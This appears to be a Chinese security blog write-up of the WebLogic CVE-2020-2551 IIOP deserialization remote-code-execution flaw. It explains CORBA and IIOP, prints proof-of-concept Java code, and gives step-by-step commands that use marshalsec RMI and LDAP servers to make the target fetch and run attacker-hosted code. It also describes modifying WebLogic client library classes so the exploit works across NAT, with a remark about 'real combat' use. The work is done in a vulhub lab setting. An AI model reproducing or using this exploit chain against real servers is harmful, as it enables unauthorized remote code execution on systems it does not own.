用淘宝来举例，淘宝网站就是servant side,店铺就是name service,顾客就是client side，店铺name service向淘宝
servant side 注册店铺，顾客client side 访问淘宝servant side去找到店铺name service。
**3.5.IIOP、GIOP**
GIOP全称（General Inter-ORB
Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet
Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。
**3.6.RMI-IIOP**
RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。但是现在有了RMI-IIOP，稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，这样综合了RMI的简单性和CORBA的多语言性兼容性，RMI-IIOP克服了RMI只能用于Java的缺点和CORBA的复杂性。
在Weblogic中实现了RMI-IIOP模型。
**4.公开POC代码分析**
参考：漫谈 WebLogic CVE-2020-2551 
    public static void main(String[] args) throws Exception {
            String ip = "127.0.0.1";
            String port = "7001";
            Hashtable env = new Hashtable();
            env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
            env.put("java.naming.provider.url", String.format("iiop://%s:%s", ip, port));
             //请求NameService
            Context context = new InitialContext(env);
            //配置JtaTransactionManager的lookup地址
            JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
            jtaTransactionManager.setUserTransactionName("rmi://127.0.0.1:1099/Exploit");
    //使用基于AnnotationInvocationHandler的动态代理，自动反序列化JtaTransactionManager，从而加载rmi协议指定的类
            Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), Remote.class);
            context.bind("hello", remote);//注册远程对象
        }
**5.Y4er完整POC**
Github：  
**感谢Y4er分享，本次是在他的POC基础上进行了改造。**
**6.POC编译、Weblogic搭建**
**6.1.导入工程、运行、生成Jar包**
打开IDEA,左上角进行File->New  
**生成jar包：**
**6.2.搭建Weblogic10.3.6.0环境**
参考：  
cd vulhub/weblogic/CVE-2017-10271/ && docker-compose up -d  
Weblogic Docker ip:172.20.0.2  
Kali ip:192.168.152.128  
**7.Kali虚拟机本地直连网络测试（成功）**
**7.1.攻击准备**  
编译exp class:  
javac -source 1.6 -target 1.6 exp.java  
搭建RMI Server,HTTP Server,执行POC:
    python -m SimpleHTTPServer 80
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer "http://192.168.152.128/#exp" 1099
    java -jar CVE-2020-2551.jar 192.168.152.128 7001 rmi://192.168.152.128:1099/exp
注意：实战中HTTP Server 和RMI Server 的端口需要在防火墙上开放  
Linux 开放80端口 :  
iptables -I INPUT -p tcp --dport 80 -j ACCEPT
**7.2.开始抓包，并攻击**
确定网卡名称：  
执行抓包命令：tcpdump -i br-56b6c2497082 -n -w deserlab.pcap，攻击完成后ctrl+c 结束命令  
**7.3.分析攻击流程**
将保存的deserlab.pcap拷贝出来，用wireshark打开并分析  
**8.Win10 攻击Weblogic Docker测试（失败）**
Win10(宿主机) IP: 192.168.152.1  
Kali 虚拟机（NAT网络）IP：192.168.152.128  
Weblogic Docker (Kali虚拟机)IP: 172.20.0.2
HTTP Server 和RMI Server 继续放在Kali 上，不影响测试。  
这个漏洞的网络问题是攻击机器和Weblogic真实内网ip不能互访导致的。
**8.1.本地调试**
**8.2.开启WireShark抓包**
抓两个网卡，一个是VMware NAT，一个是宿主机的网卡（WLAN或有线）  
**8.3.运行攻击代码**
**8.4.分析攻击流程**
通过分析，发现Weblogic 回复NameService地址172.20.0.2后，Win10宿主机是无法访问到的：  
通过WLAN网卡抓包，也证实了bind的时候无法连接172.20.0.2:  
**8.5.问题总结**
通过IIOP协议向Weblogic请求NameService时，Weblogic直接使用本地ip地址作为bind地址，构造地址信息回复，客户端解析地址信息，bind的时候直接访问该地址，但由于无法访问真实内网地址，导致bind失败。
**9.解决过程**
**9.1.网上解决思路**
漫谈 WebLogic CVE-2020-2551 里有简单说了一种思路，自定义GIOP协议：  
**9.2.个人思路**
重写IIOP协议，对于刚接触IIOP的人来说不太现实。
既然是因为Weblogic 返回的地址信息（LocateReply）导致的，在客户端处理Weblogic
地址信息时，将地址信息设置为外网ip和端口，然后让后续流程继续走下去就行。
**9.3.定位关键代码**
观察抓包情况，定位到发包代码：  
继续研究LocateReply是怎么处理的，发现reply只能由SequencedRequestMessage的notify设置，所以设置一个断点，跑一下看看调用流程：  
继续看createMsgFromStream函数，  
**9.4.重写处理逻辑**
IOPProfile在项目里的库wlfullclient.jar中定义，wlfullclient.jar是从Weblogic 10.3.6环境中导出来的。
IOPProfile路径：  
CVE-2020-2551\src\lib\wlfullclient.jar!\weblogic\iiop\IOPProfile.class
这里有个知识点，Java中可以编译某个库的单个class，然后重新打包，生成新的库，这样就可以改变原来库的处理逻辑。  
**9.5.打包测试**
Build->Build Artifacts->Rebuild 重新编译生成Jar包
Win10上执行：
    java -jar CVE-2020-2551.jar 192.168.152.128 7001 rmi://192.168.152.128:1099/exp
LDAP 利用方式：  
LDAP Server:  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
"" 1389
Win10上执行：  
java -jar CVE-2020-2551.jar 192.168.152.128 7001
ldap://192.168.152.128:1389/exp  
**10.参考资料**  
CVE-2020-2551 POC 
Weblogic CVE-2020-2551 IIOP协议反序列化RCE 
漫谈 WebLogic CVE-2020-2551 
深入理解JAVA反序列化漏洞 
Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） 
WebLogic CVE-2020-2551漏洞分析 
Java CORBA 